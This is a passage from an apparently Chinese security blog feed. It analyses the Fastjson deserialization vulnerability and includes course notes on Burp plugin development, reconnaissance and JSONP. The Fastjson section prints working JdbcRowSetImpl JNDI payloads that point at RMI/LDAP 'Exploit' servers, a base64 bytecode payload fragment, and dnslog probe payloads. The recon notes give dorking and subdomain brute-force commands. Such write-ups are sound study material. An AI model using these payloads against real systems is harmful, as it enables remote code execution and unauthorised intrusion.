AADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ="</span>],<span class="string">'_name'</span>:<span class="string">'a.b'</span>,<span class="string">'_tfactory'</span>:&#123; &#125;,<span class="string">"_outputProperties"</span>:&#123; &#125;&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="再窥Payload"><a href="#再窥Payload" class="headerlink" title="再窥Payload"></a>再窥Payload</h2><p>&emsp;&emsp; 观察发现这个payload由三部分组成，<code>@type</code>、<code>dataSourceName</code>、<code>autoCommint</code>。第一个<code>@type</code>前面已经提及了是获取实例化类，<code>dataSourceName</code>和<code>autoCommit</code>我们看看官方文档。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String payload =   <span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","</span> +</span><br><span class="line">              <span class="string">"\"dataSourceName\":\"rmi://localhost:1090/Exploit\",\"autoCommit\":true&#125;"</span>;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 大致意思：使用该方法的名称绑定到<code>JNDI命名服务</code>中的<code>DataSource</code>对象上，应用程序就可以使用该名称进行查找，检索绑定到它的DataSource对象。<br><img src="https://img-blog.csdnimg.cn/20200720140337267.png" alt="在这里插入图片描述">&emsp;&emsp; 设置<code>AutoCommit</code>后，会<code>自动提交内容</code>。设置这个属性之后，JNDI找到对应资源，对自动提交内容，读者后期可以试试删除这个属性是不会触发漏洞的。<br><img src="https://img-blog.csdnimg.cn/20200720140401249.png" alt="在这里插入图片描述"><br><strong>知道上面这些特性后，根据特点构造等价代码</strong><br><a href="http://www.herongyang.com/JDBC/MySQL-JdbcRowSet-DataSource.html" target="_blank" rel="noopener">国外介绍JdbcRowSet 使用方法的一个小案例，可以参考一下。</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">JdbcRowSetImpl jdbcRowSet = <span class="keyword">new</span> JdbcRowSetImpl();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            jdbcRowSet.setDataSourceName(<span class="string">"ldap://127.0.0.1:1389/Exploit"</span>);</span><br><span class="line">            jdbcRowSet.setAutoCommit(<span class="keyword">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException throwables) &#123;</span><br><span class="line">            throwables.printStackTrace();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><hr><h1 id="漏洞成因分析"><a href="#漏洞成因分析" class="headerlink" title="漏洞成因分析"></a>漏洞成因分析</h1><p>&emsp;&emsp; JSON#parse()方法会调用<code>DefaultJSONParser#parse()</code>，在实例化DefaultJSONParser类是会将输入数据使用实例化JSONScanner类传入，并同时传入默认缺省配置<code>features</code>。<br><img src="https://img-blog.csdnimg.cn/20200720150738738.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200720150903703.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 这个 lexer 属性实际上是在 DefaultJSONParser 对象被实例化的时候创建的。<br><img src="https://img-blog.csdnimg.cn/20200720151203563.png" alt="在这里插入图片描述"><br>&emsp;&emsp; DefaultJSONParser在实例化时会读取当前字符<code>ch={</code>，所以<code>lexer.token()=12</code>。<br><img src="https://img-blog.csdnimg.cn/20200720151810322.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/2020072015182461.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 跳转12会创建JSONObject类对象，然后再调用 <code>DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code>方法去解析。<br><img src="https://img-blog.csdnimg.cn/2020072015285868.png" alt="在这里插入图片描述"><br>&emsp;&emsp; DefaultJSONParser#parseObject前面会做一个简单判断<code>lexer.token()</code>，然后读取字符判断是否<code>ch==&#39;&quot;&#39;</code>，TRUE就获取其中的字段的值<code>@type</code>并紧接着判断<code>key == JSON.DEFAULT_TYPE_KEY</code>相等。<br><img src="https://img-blog.csdnimg.cn/20200720153408265.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200720170453343.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200720171815712.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 接下去进入反序列化阶段<code>deserializer#deserialze()</code>–&gt;<code>parseRest()</code>–&gt;<code>fieldDeser#setValue</code>–&gt;一系列反射调用–&gt;<code>JdbcRowSetImpl#setAutoCommit()</code>触发漏洞。</p><p><img src="https://img-blog.csdnimg.cn/20200720173838924.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200720174044552.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200720174142800.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200720174203729.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200720174332739.png" alt="在这里插入图片描述"><br><strong>最后得到Gadget chain如下</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gadget chain:</span></span><br><span class="line"><span class="comment"> *      JSON.parse()</span></span><br><span class="line"><span class="comment"> *          DefaultJSONParser.parse()</span></span><br><span class="line"><span class="comment"> *              DefaultJSONParser.parseObject()</span></span><br><span class="line"><span class="comment"> *                  JavaBeanDeserializer.deserialze()</span></span><br><span class="line"><span class="comment"> *                      JavaBeanDeserializer.parseRest()</span></span><br><span class="line"><span class="comment"> *                          FieldDeserializer.setValue()</span></span><br><span class="line"><span class="comment"> *                              Reflect.invoke()</span></span><br><span class="line"><span class="comment"> *                                  JdbcRowSetImpl.setAutoCommit()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200720185616310.png" alt="在这里插入图片描述"></p><hr><h1 id="DNSLOG的一个小点"><a href="#DNSLOG的一个小点" class="headerlink" title="DNSLOG的一个小点"></a>DNSLOG的一个小点</h1><p>&emsp;&emsp; 实战挖掘fastjson漏洞的时候比较常用的方法，探测Fastjson是用dnslog方式，探测到了再用RCE Payload去一个一个打。但是本人在本地环境测试的时候发现了几个不同点，fastjson的版本不同，不同的payload成功概率是不同的。至于为什么是这样子，可以参考一下这篇<a href="http://gv7.me/articles/2020/several-ways-to-detect-fastjson-through-dnslog/" target="_blank" rel="noopener">通过dnslog探测fastjson的几种方法</a>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 目前最新版1.2.72版本可以使用1.2.36 &lt; fastjson &lt;= 1.2.72</span></span><br><span class="line">String payload = <span class="string">"&#123;&#123;\"@type\":\"java.net.URL\",\"val\""</span> +</span><br><span class="line">        <span class="string">":\"http://9s1euv.dnslog.cn\"&#125;:\"summer\"&#125;"</span>;</span><br><span class="line"><span class="comment">// 全版本支持 fastjson &lt;= 1.2.72</span></span><br><span class="line">String payload1 = <span class="string">"&#123;\"@type\":\"java.net.Inet4Address\",\"val\":\"zf7tbu.dnslog.cn\"&#125;"</span>;</span><br><span class="line">String payload2 = <span class="string">"&#123;\"@type\":\"java.net.Inet6Address\",\"val\":\"zf7tbu.dnslog.cn\"&#125;"</span>;</span><br></pre></td></tr></table></figure><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://www.b1ue.cn/archives/184.html" target="_blank" rel="noopener">http://www.b1ue.cn/archives/184.html</a><br><a href="http://www.herongyang.com/JDBC/MySQL-JdbcRowSet-DataSource.html" target="_blank" rel="noopener">http://www.herongyang.com/JDBC/MySQL-JdbcRowSet-DataSource.html</a><br><a href="https://docs.oracle.com/cd/E17824_01/dsc_docs/docs/jscreator/apis/rowset/com/sun/rowset/JdbcRowSetImpl.html" target="_blank" rel="noopener">https://docs.oracle.com/cd/E17824_01/dsc_docs/docs/jscreator/apis/rowset/com/sun/rowset/JdbcRowSetImpl.html</a><br><a href="http://gv7.me/articles/2020/several-ways-to-detect-fastjson-through-dnslog/" target="_blank" rel="noopener">http://gv7.me/articles/2020/several-ways-to-detect-fastjson-through-dnslog/</a><br><a href="https://www.freebuf.com/news/232758.html" target="_blank" rel="noopener">https://www.freebuf.com/news/232758.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp; Fastjson这款国内知名的解析json的组件，笔者在此就不多介绍，网络上有很多分析学习fastjson反序列化
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="反序列化 Java" scheme="https://summersec.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Java/"/>
    
  </entry>
  
  <entry>
    <title>JDSRC安全课笔记</title>
    <link href="https://summersec.github.io/2020/07/20/JSRC%E5%AE%89%E5%85%A8%E8%AF%BE%E7%AC%94%E8%AE%B0/"/>
    <id>https://summersec.github.io/2020/07/20/JSRC%E5%AE%89%E5%85%A8%E8%AF%BE%E7%AC%94%E8%AE%B0/</id>
    <published>2020-07-20T11:01:42.000Z</published>
    <updated>2020-07-20T11:21:37.792Z</updated>
    
    <content type="html"><![CDATA[<p>﻿# 第一期</p><h2 id="逻辑漏洞挖掘"><a href="#逻辑漏洞挖掘" class="headerlink" title="逻辑漏洞挖掘"></a>逻辑漏洞挖掘</h2><p>&emsp;&emsp; 逻辑漏洞中的认证缺失和认证缺陷漏洞，主要指功能级访问控制缺失，出现任意增删改查用户信息的情况。实际业务场景中，这类漏洞大概两个成因，上线前没有做好认证处理，或权限环节控制不到位。基于工具开发，我们可以通过域名信息收集、站点信息爬取、规则的分析与提取，以及批量处理结果分析与展示四个环节快速发现认证缺失漏洞和认证缺陷漏洞。</p><h1 id="第二期"><a href="#第二期" class="headerlink" title="第二期"></a>第二期</h1><h2 id="基于-burpsuite的web逻辑漏洞插件开发"><a href="#基于-burpsuite的web逻辑漏洞插件开发" class="headerlink" title="基于 burpsuite的web逻辑漏洞插件开发"></a>基于 burpsuite的web逻辑漏洞插件开发</h2><p>Burp Suite作为web应用程序渗透测试集成平台,常被用来进行网站渗透测试。BurpSuite 提供了插件开发接口，支持Java、Python、Ruby语言的扩展。虽然 BApp Store 上面已经提供了很多插件，其中也不乏优秀好用的插件，（推荐几个个人感觉好的插件）CO2,Logger++,Autorize,XSS Validator。但是通用化的工具无法完全符合web安全测试人员的特定需求。</p><p>1、为什么要独立开发插件<br>2、开发环境配置说明；<br>3、插件开发关键接口的使用实例；<br>4、逻辑漏洞检测插件开发探讨；</p><p>1.为什么要独立开发插件<br>随着厂商安全意识增强，传输过程中，大多数线上业务通过https传输，传输流量加密。无法做中间人攻击了就，服务端，数据库中的敏感数据加密存储，访问控制受限，即使拿到数据库也无法拿到明文数据。但是数据在客户端最终要展示给用户，必然明文展现。传统的安全防御设备和措施对逻辑漏洞收效甚微，现在攻击者更倾向于在客户端利用此类漏洞。而逻辑漏洞种类很多，通用化的工具无法完全符合web安全测试人员的特定需求。一个业务的逻辑漏洞抽象出来的模型，难以在其他业务层进行批量处理，通用的解决方案往往效果不佳。但是一个业务层抽象出来的模型，在其自身站点往往具有通用性。例如，某URL存在越权，可能该站点其他URL也可能存在类似的问题。我们基于该URL特征，开发burpsuite插件，批量扫描该站点，就能更全面的发现同类问题。因此，我们有必要根据自己的业务需求，自己能够独立开发插件。</p><p>2.开发环境配置<br>Burp支持Java、Python、Ruby语言的扩展，本次讲座以python环境为 例进行说明。Burpsuite 是运行在java环境，所有的库是java所写。Python作为开发语言，调用Java库就要用到Jython。</p><p>以MacOS为 例子进行说明：<br>brew install jython，就可以了，Burpsuite Jython环境的配置：Extender -&gt; options -&gt; python Environment -&gt; select file,导入下载好的jython jar包。<img src="https://img-blog.csdnimg.cn/20200207154012356.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3.：插件开发关键接口的使用实例，重点讲几个接口</p><p>API接口查阅可以从以下拿到：<br>API接口文档可以在burpsuite 的Extender -&gt; APIs<br>也可以通过<a href="https://portswigger.net/burp/extender/api/index.html进行查阅。" target="_blank" rel="noopener">https://portswigger.net/burp/extender/api/index.html进行查阅。</a><br>IBurpExtender<br>IBurpExtender是Burpsuite插件的入口，所有插件的开发都必须要实现。<br>当插件被建立以后，registerExtenderCallbacks也需要实现。<br>代码如下：class BurpExtender(IBurpExtender):<br>def registerExtenderCallbacks(self, callbacks):<br>参数callbacks可获取核心基础库,例如日志，请求，返回值修改等。<br>IExtensionHelpers:<br>提供了编写扩展中常用的一些通用函数，比如编解码、构造请求、获取请求参数，获取请求头等。如：IRequestInfo analyzeRequest(byte[] request)<br>通过analyzeRequest函数，可以拿到请求的细节。<br>通过如下几个接口方法可以拿到。<br><img src="https://img-blog.csdnimg.cn/20200207154237626.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>IHttpRequestResponse: 这个接口包含了每个请求和响应的细节。在Brupsuite中的每个请求或者响应都是IHttpRequestResponse实例。通过getRequest()， getResponse()方法可以获取请求和响应的细节信息。</p><p>以registerHttpListener为例进行代码说明：</p><p><img src="https://img-blog.csdnimg.cn/2020020715432066.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>如图所示，在user 和 webserver之间建立监听，调用HttpListener接口。获取请求，响应的日志。<br>实现这个功能，最重要的是这个方法：    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">register ourselves as an HTTP listener callbacks.registerHttpListener(self)</span><br><span class="line">    def registerExtenderCallbacks(self, callbacks):</span><br><span class="line">        self._callbacks &#x3D; callbacks</span><br><span class="line">        self._helpers &#x3D; callbacks.getHelpers()</span><br><span class="line">        ## 设置插件名</span><br><span class="line">        self._callbacks.setExtensionName(&quot;getTheRequest&quot;)</span><br></pre></td></tr></table></figure><pre><code> # //如果没有注册，下面的processHttpMessage方法是不会生效的。处理请求和响应包的插件，这个应该是必要的   callbacks.registerHttpListener(self)### processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo)，### 在messageInfo这个参数中，我们可以获取到request和response日志。</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">processHttpMessage</span><span class="params">(self, toolFlag, messageIsRequest, messageInfo)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> toolFlag == <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> messageIsRequest:</span><br><span class="line">                request = messageInfo.getRequest()</span><br><span class="line">                analyzedRequest = self._helpers.analyzeResponse(request)</span><br><span class="line">                request_header = analyzedRequest.getHeaders()</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    method, path = res_path.findall(request_header[<span class="number">0</span>])[<span class="number">0</span>]</span><br><span class="line">                    host = res_host.findall(request_header[<span class="number">1</span>])[<span class="number">0</span>]</span><br><span class="line">                    url = method + <span class="string">" "</span> + host + path</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    url = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> method == <span class="string">"GET"</span>:</span><br><span class="line">                    <span class="keyword">print</span> “[+++++]The URL <span class="keyword">is</span> <span class="string">", url</span></span><br><span class="line"><span class="string">                    print "</span>[+++++]The host <span class="keyword">is</span> <span class="string">",host</span></span><br><span class="line"><span class="string">                    print "</span>[++++] The URI <span class="keyword">is</span> following<span class="string">"</span></span><br><span class="line"><span class="string">                    print path</span></span><br><span class="line"><span class="string">                    for iterm in path.split("</span>/<span class="string">"):</span></span><br><span class="line"><span class="string">                        print iterm</span></span><br><span class="line"><span class="string">                    print "</span>======================================================================================<span class="string">"</span></span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure><p><code>代码如上所示，就可以打印出URL，HOST，URI日志信息</code><br><img src="https://img-blog.csdnimg.cn/20200207154729683.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这是一个demo。延伸一下，我们在做渗透测试的过程中，往往苦于目录字典不全，我们将这个URI生成目录字典，为目录爆破做准备。</p><hr><p>如果做扫描类插件：<br>class BurpExtender(IBurpExtender,IScannerCheck)<br>callbacks.registerScannerCheck(this);<br>实现IScannerCheck后需要重写被动扫描的函数。<br>doPassiveScan(IHttpRequestResponse baseRequestResponse) {}<br>doPassiveScan这个接口，在baseRequestResponse获取请求和响应数据，并利用这些数据进行基于扫描规则进行扫描。</p><h1 id="第四期-SRC挖掘"><a href="#第四期-SRC挖掘" class="headerlink" title="第四期 SRC挖掘"></a>第四期 SRC挖掘</h1><p>首先将公司架构吧，我们就以京东为例吧</p><p>企业的组织架构信息可通过开源信息获取。<br>常用的方法，通过维基百科，百度百科等确定企业的大体组织架构；<br>zh.wikipedia.org<br>baike.baidu.com</p><p><img src="https://img-blog.csdnimg.cn/20200306154856499.jpg" alt="在这里插入图片描述">结合以下站点信息，进一步确定企业组织架构：<br>国家企业信用公示系统：<a href="http://www.gsxt.gov.cn/index.html" target="_blank" rel="noopener">http://www.gsxt.gov.cn/index.html</a><br>天眼查：<a href="https://www.tianyancha.com/" target="_blank" rel="noopener">https://www.tianyancha.com/</a></p><p>公司架构确定完成后，我们开始被动信息的收集</p><p>被动信息收集是指不与目标直接交互，通过公开的渠道获取获取目标信息。<br>可从以下几点展开，DNS信息收集，https证书信息，搜索引擎，网络空间安全搜索引擎，基于备案资料信息收集。</p><p>DNS信息收集<br>通过目标站点的域名注册信息，如whois日志进行信息关联。</p><p>国外常用的whois查询站点：<br><a href="https://who.is/" target="_blank" rel="noopener">https://who.is/</a><br><a href="https://whois.cymru.com/cgi-bin/whois.cgi" target="_blank" rel="noopener">https://whois.cymru.com/cgi-bin/whois.cgi</a><br><a href="https://whois.arin.net/ui/query.do" target="_blank" rel="noopener">https://whois.arin.net/ui/query.do</a></p><p>国内常用的whois查询站点：<br>[图片]<a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a><br><a href="https://whois.aizhan.com/" target="_blank" rel="noopener">https://whois.aizhan.com/</a></p><p>通过whois查询确定注册者，然后关联同一注册者的其他站点信息。</p><p><a href="https://viewdns.info/reversewhois/?q=email@111.com" target="_blank" rel="noopener">https://viewdns.info/reversewhois/?q=email@111.com</a><br><a href="https://whois.chinaz.com/reverse?ddlSearchMode=2" target="_blank" rel="noopener">https://whois.chinaz.com/reverse?ddlSearchMode=2</a></p><p>https证书信息，即通过https证书进行信息收集，可通过采用以下几种方式</p><p>基于证书透明度两个站点：<br><a href="https://certspotter.com/api/v0/certs" target="_blank" rel="noopener">https://certspotter.com/api/v0/certs</a><br><a href="https://crt.sh" target="_blank" rel="noopener">https://crt.sh</a></p><p>为方便信息处理，可编写脚本处理：<br>crtFetch -d example.com</p><p><img src="https://img-blog.csdnimg.cn/2020030615473366.jpg" alt="在这里插入图片描述"><br>我们看到就可以梳理出一部分子域名信息了<br>脚本位置：<a href="https://github.com/3stoneBrother/personalTools/blob/master/scripts/crtFetch.py" target="_blank" rel="noopener">https://github.com/3stoneBrother/personalTools/blob/master/scripts/crtFetch.py</a></p><p>该脚本对在线站点获取的域名进行清洗，可获取到单域名SSL证书和通配符SSL证书两类。</p><p>有时候我们可能忽略的地方，有些企业的https证书中的相关域名可在浏览器证书中点击查看；</p><p><img src="https://img-blog.csdnimg.cn/20200306154605875.jpg" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200306154625356.jpg" alt="在这里插入图片描述"></p><p>基于goolge hack技术可以查询到很多敏感信息。<br>更详细的用法可在这里查询：<br><a href="https://www.exploit-db.com/google-hacking-database" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database</a></p><p>我们常用关键字查询：<br>site：搜索域名的范围<br>inurl：URL格式<br>intitle：搜索的网页标题<br>intext：搜索包含其中文字的网页<br>filetype：搜索文件的后缀或者扩展名<br>cache：搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息<br>link：搜索某个网站的链接<br>info：查找指定站点的一些基本信息</p><h2 id="【查找敏感文件】"><a href="#【查找敏感文件】" class="headerlink" title="【查找敏感文件】"></a>【查找敏感文件】</h2><p>site:xxx.com (filetype:doc OR filetype:ppt OR filetype:pps OR filetype:xls OR filetype:docx OR filetype:pptx OR filetype:ppsx OR filetype:xlsx OR filetype:odt OR filetype:ods OR filetype:odg OR filetype:odp OR filetype:pdf OR filetype:wpd OR filetype:svg OR filetype:svgz OR filetype:indd OR filetype:rdp OR filetype:sql OR filetype:xml OR filetype:db OR filetype:mdb OR filetype:sqlite)</p><h2 id="【查找敏感目录地址】"><a href="#【查找敏感目录地址】" class="headerlink" title="【查找敏感目录地址】"></a>【查找敏感目录地址】</h2><p>site:xxx.com inurl:login|admin|manage|admin_login|system|user|auth|dev|test<br>site:xxx.com intitle:后台|管理|内部|登录|系统</p><p>以下可能是我们会忽略的几个关键字查询语句：</p><h3 id="基于备案号，copyright信息查询"><a href="#基于备案号，copyright信息查询" class="headerlink" title="基于备案号，copyright信息查询"></a>基于备案号，copyright信息查询</h3><p>intext:”Tesla © 2020”<br>intext:”京ICP备11041704号-15”</p><h2 id="可以正则的形式"><a href="#可以正则的形式" class="headerlink" title="可以正则的形式"></a>可以正则的形式</h2><p>site:dev.<em>.</em>/signin<br>site:<em>/recover-pass<br>site:smtp.</em>.<em>/login<br>site:/com:</em><br>site:/216.75.<em>.</em></p><p>##基于端口或者端口范围查询<br>site:/com:8443/<br>site:/com:* 8000…9000</p><p>查询到的关键词，利用备案信息可以大致确定各个站点的域名信息。</p><p><img src="https://img-blog.csdnimg.cn/20200306155039691.jpg" alt="在这里插入图片描述"><br>curl <a href="http://www.beianbeian.com/search-1/example.html" target="_blank" rel="noopener">http://www.beianbeian.com/search-1/example.html</a> | grep “<br>“ |  grep -o “www.\w<em>.\w</em>“ | sort | uniq |sed “s/www.//g”</p><p><img src="https://img-blog.csdnimg.cn/20200306155121441.png" alt="在这里插入图片描述"></p><p>不断的根据网络备案/许可证号进行反查，即可梳理更多的资产信息。<br>确定企业的IP段，可基于<a href="https://bgp.he.net/站点进行收集。" target="_blank" rel="noopener">https://bgp.he.net/站点进行收集。</a><br>输入公司名称可查询该公司的IP资产信息，然后正则匹配IP段：<br>cat aa.txt| grep -Eo “&lt;td&gt;.<em>?td&gt;“| grep “href”| grep -Eo “([0-9]{1,3}[.]){3}[0-9]{1,3}/</em>[0-9]{0,2}”</p><h2 id="微信公共号"><a href="#微信公共号" class="headerlink" title="微信公共号"></a>微信公共号</h2><p>基于公众号信息，我们可以挖掘到很多的厂商业务信息。公司的公众号信息可在sogou搜索引擎可以进行查询。<br><a href="https://weixin.sogou.com/weixin?type=1&amp;ie=utf8&amp;query=%E4%BA%AC%E4%B8%9C" target="_blank" rel="noopener">https://weixin.sogou.com/weixin?type=1&amp;ie=utf8&amp;query=%E4%BA%AC%E4%B8%9C</a><br>为便于快速梳理，可用脚本处理。<br>python gongzhonghao.py -d “目标公司”<br><a href="https://github.com/3stoneBrother/personalTools/blob/master/scripts/gongzhonghao.py" target="_blank" rel="noopener">https://github.com/3stoneBrother/personalTools/blob/master/scripts/gongzhonghao.py</a></p><p><img src="https://img-blog.csdnimg.cn/20200306155403699.jpg" alt="在这里插入图片描述"><br>这就得到某公司的所有公众号信息</p><h2 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h2><p>通过被动信息收集到一批域名，IP信息。以主动信息比较容易忽略的三级域名，甚至四级域名为例进行说明。通配符SSL证书往往是三级、四级域名高效爆破的目标，为批量处理，在crtFetch脚本中提取了需要进一步爆破的三级、四级域名。</p><p>然后进行域名爆破，爆破工具有很多，以gobuster为例进行演示：<br>gobuster dns -t 30 -w  sub_name.txt -i  -q –wildcard -d api.example.com| tee  domains-active.txt</p><p><img src="https://img-blog.csdnimg.cn/20200306155621157.png" alt="在这里插入图片描述"><br>这些三级四级域名，防护往往会薄弱一些</p><p>域名是否存活可利用httprobe工具确定。<br>cat domain.txt | httprobe &gt; domain-alive.txt </p><p><img src="https://img-blog.csdnimg.cn/20200306155753708.png" alt="在这里插入图片描述"><br>也可通过whatweb查看链接的服务器版本，标题等信息，处理结果如下图所示<br><img src="https://img-blog.csdnimg.cn/20200306155835844.png" alt="在这里插入图片描述"><br>为便于批量查看URL内容，我们可通过屏幕截图工具webscreenshot进行处理。<br>具体方法如下：首先将存活的站点截图到screenshots文件夹下面：<br>webscreenshot -i alive.txt -o screenshots -w 20 -m -a “X-FORWARDED-FOR:127.0.0.1”<br>为便于浏览，我们将截图生成一个html文件便于在浏览器查看：<br>for I in $(ls -S); do echo “$I” &gt;&gt; index.html；echo “&lt;\ img src=$I&gt;&lt;br&gt;” &gt;&gt; index.html； done<br>在浏览器中打开 index.html文件，就可看到所有的网页截图了。效果如下图，所有存活站点都在一个页面展现出来。可根据站点内容做进一步的渗透测试。</p><hr><h1 id="第五期"><a href="#第五期" class="headerlink" title="第五期"></a>第五期</h1><p>&emsp;&emsp; 在企业级应用开发中，经常会遇到跨域数据交互的问题，例如多个子集应用之间通过跨域获取用户登录状态及身份信息等，从而能够满足现代web应用中的实际需求。因此谈到跨域就要了解下浏览器的同源策略。<br>&emsp;&emsp; 浏览器的同源策略（Same Origin Policy,SOP）,同源要求两个页面具有相同的协议、域名、端口号。当A应用(<a href="https://www.a.com)想请求B应用(https://www.b.com)里面的某个接口" target="_blank" rel="noopener">https://www.a.com)想请求B应用(https://www.b.com)里面的某个接口</a>(提交操作）或者读取接口返回的数据作进一步的处理的话，这时就需要考虑跨域问题了，一般情况下浏览器会阻止这种不安全的跨域行为。但在html语言中，有些标签是具备天然的跨域功能的，比如&lt;script&gt;、&lt;img&gt;、&lt;iframe&gt;等标签是可以直接跨域请求其它域的资源的，这就催生了JSONP(JSON with Padding)，JSONP本质上是利用了&lt;script&gt;标签的跨域能力。</p><h2 id="JSONP跨域安全开发实践方面"><a href="#JSONP跨域安全开发实践方面" class="headerlink" title="JSONP跨域安全开发实践方面"></a>JSONP跨域安全开发实践方面</h2><p>a.com 想要跨域读取b.com下的/getinfo的返回数据，a.com前端示例代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;    </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonp_callback</span><span class="params">(msg)</span></span>&#123;      </span><br><span class="line"> <span class="keyword">do</span> something();<span class="comment">//回调函数，自定义读取数据后续操作    </span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src =<span class="string">"http://b.com/getinfo?callback=jsonp_callback"</span> type=<span 